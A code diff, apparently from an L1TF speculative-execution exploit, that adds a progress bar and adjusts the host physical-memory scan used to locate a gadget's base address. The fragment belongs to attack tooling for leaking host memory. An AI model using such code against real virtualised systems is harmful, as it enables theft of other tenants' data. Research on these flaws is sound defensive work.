@@ -968,6 +968,18 @@ uintptr_t l1tf_find_page_pa(void *p)
   return -1;
 }
 
+void pr_find_base_progress_bar(int run, hpa_t pa, uint64_t t0)
+{
+  const int BAR_LEN = 80;
+  double time = (clock_read()-t0)/1000000000.0;
+  double speed = (double)(pa + run*HOST_MEMORY_SIZE) / time / (1UL << 30);
+  pr_dub(CLEAR_LINE "Attempt %d, speed %.1fGB/s, progress 0GB [", run+1, speed);
+  int pos = BAR_LEN * pa / HOST_MEMORY_SIZE;
+  for (int i = 0; i < BAR_LEN; i++)
+    pr_dub("%c", i == pos ? '>' : (i < pos ? '=' : ' '));
+  pr_dub("] %ldGB", HOST_MEMORY_SIZE >> 30);
+}
+
 uintptr_t l1tf_find_base(void)
 {
   const int verbose = 1;
@@ -983,14 +995,11 @@ uintptr_t l1tf_find_base(void)
   uint64_t t_start = clock_read();
 
   for (int run = 0; run < 100000; run++) {
-    uintptr_t start = 0x218; uintptr_t end = HOST_MEMORY_SIZE;
+    uintptr_t start = H_MAP_PHYS_MAP; uintptr_t end = HOST_MEMORY_SIZE;
     // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
-      if (verbose >= 2) if (pa % (16*1024*1024) == (start & 0xfff)) {
-        fprintf(stderr, "l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
-        fflush(stdout);
-        fprintf(stderr, "\33[2K\r");
-      }
+      if ((pa % 0x1000000) == (start & 0xfff))
+        pr_find_base_progress_bar(run, pa, t_start);
 
       int off;
       for (off = 0; off < 16; off += 8) {
@@ -1002,13 +1011,8 @@ uintptr_t l1tf_find_base(void)
       if (off >= 16) {
         spectre_touch_base_stop();
         l1tf_leak_buffer_modify(&leak_addr, leak_addr.original_pfn << 12);
-        if (verbose >= 1) {
-          double time = (clock_read()-t_start)/1000000000.0;
-          uintptr_t len = (pa-start) + run*(end-start);
-          fprintf(stderr, "l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
-          pr_dub("Found gadget's base at hpa %lx in %.1f seconds. (search speed: %.1f MB/s)\n", pa, time, len/time / (1024*1024));
-          l1tf_test_base(pa, 100000);
-        }
+        l1tf_test_base(pa, 100000);
+        pr_dub("\nFound gadget's base at hpa %lx.\n", pa);
         return pa;
       }
     }
